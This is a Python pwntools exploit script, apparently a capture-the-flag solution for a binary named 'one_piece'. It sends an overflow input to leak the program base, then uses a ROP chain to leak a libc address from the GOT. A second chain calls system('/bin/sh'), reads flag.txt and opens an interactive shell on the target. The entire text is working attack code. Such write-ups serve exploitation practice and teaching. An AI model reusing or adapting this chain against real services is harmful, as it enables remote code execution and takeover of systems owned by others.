from pwn import *
from time import sleep
#p = process("./one_piece")
p = remote("127.0.0.1",1234)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF('libc6_2.30-0ubuntu2_amd64.so')
payload = "A"*37 + "zz"
p.sendline("read")
p.sendline(payload)
p.sendline("gomugomunomi")
p.recvuntil("right ? : ")
leak = int("0x" + p.recvline(),16)
binaire = leak - 0x1325
puts_plt = binaire + 0x1030
printf_plt = binaire + 0x1040
strcmp_got = binaire + 0x4038
#Gadgets
poprdi = binaire + 0x148b
ret = binaire + 0x1016

log.info("binary base = "+hex(binaire))

payload = ""
payload += cyclic(56)
payload += p64(ret)
payload += p64(poprdi)
payload += p64(binaire+0x4018) #puts_got
payload += p64(puts_plt)
payload += p64(binaire+0x10b0) #_start
pause()
p.sendline(payload)
p.recvline()
leaklibc = u64(p.recvline().ljust(8,"\x00")) % 0xa000000000000
print "leaklibc = ",hex(leaklibc)
base = leaklibc - libc.symbols['puts']
log.info("libc base = "+hex(base)) 
p.sendline("read")
p.sendline("A"*37 + "zz")
p.sendline("gomugomunomi")
sleep(2)
system = base + libc.symbols['system']
binsh = base + libc.search("/bin/sh").next()
log.info("/bin/sh = "+hex(binsh))
log.info("system = "+hex(system))
payload = ""
payload += cyclic(56)
payload += p64(ret)
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(system)
payload += p64(leak+0x5)
p.sendline(payload)
log.warn("sending payload ...")
p.sendline("cat flag.txt")
p.interactive()